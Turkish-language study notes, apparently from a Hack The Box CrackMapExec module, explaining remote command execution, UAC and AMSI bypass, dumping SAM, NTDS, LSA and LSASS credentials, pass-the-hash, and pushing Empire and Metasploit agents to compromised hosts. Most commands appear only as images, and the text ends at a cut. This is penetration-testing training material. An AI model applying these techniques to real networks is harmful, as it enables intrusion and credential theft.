+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
